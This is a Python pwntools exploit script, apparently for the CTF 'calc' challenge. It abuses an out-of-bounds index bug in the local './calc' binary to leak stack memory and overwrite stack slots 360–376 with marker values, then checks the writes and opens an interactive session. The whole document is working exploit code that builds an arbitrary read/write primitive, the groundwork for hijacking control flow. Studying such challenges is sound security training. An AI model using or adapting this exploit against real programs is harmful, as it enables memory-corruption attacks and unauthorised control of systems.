from pwn import *

context.log_level = 'debug'   # see exactly what's sent/received while you calibrate
s = process('./calc')
s.recvline()


def leak(idx):
    s.sendline(f"+{idx}".encode())
    return int(s.recvline().strip())

def zero(idx):
    l = leak(idx)
    if l == 0:
        return
    if l > 0:
        s.sendline(f"+{idx}-{l}".encode())
    else:
        s.sendline(f"+{idx}+{-l}".encode())
    s.recvline()

def set_val(idx, val):
    zero(idx)                              # re-zero using whatever's CURRENTLY there,
    s.sendline(f"+{idx}+{val}".encode())   # not an assumption left over from a prior pass
    s.recvline()

for i in range(360, 377):
    set_val(i, 0x41414141 + i)

for i in range(360, 377):
    print(i, hex(leak(i)))   # verify each slot actually landed before doing anything else

s.interactive()